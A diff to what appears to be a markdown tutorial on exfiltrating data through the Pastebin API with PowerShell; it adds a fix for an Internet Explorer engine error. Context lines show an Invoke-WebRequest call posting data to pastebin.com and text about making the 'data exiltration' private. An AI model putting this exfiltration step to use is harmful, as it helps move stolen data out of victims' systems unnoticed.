@@ -33,6 +33,13 @@ $Body = @{
 
 Invoke-WebRequest -Uri "https://pastebin.com/api/api_post.php" -UseBasicParsing -Body $Body -Method Post -OutFile $Title.txt
 ```
+## Internet Explorer engine error
+You might encounter an error related to the "internet explorer engine", if that's the case: launch internet explorer and click through the initial setup.
+
+![Internet Explorer first setup](/images/IE11.png)
+
+This should fix your issue.
+
 ## Preparing more advanced use of Pastebin
 Thus far, our data exiltration is public.​ Thanks to the API key we can upload to Pastebin but we need to use authentication to make it private, so let’s make it private​ 😃.
 
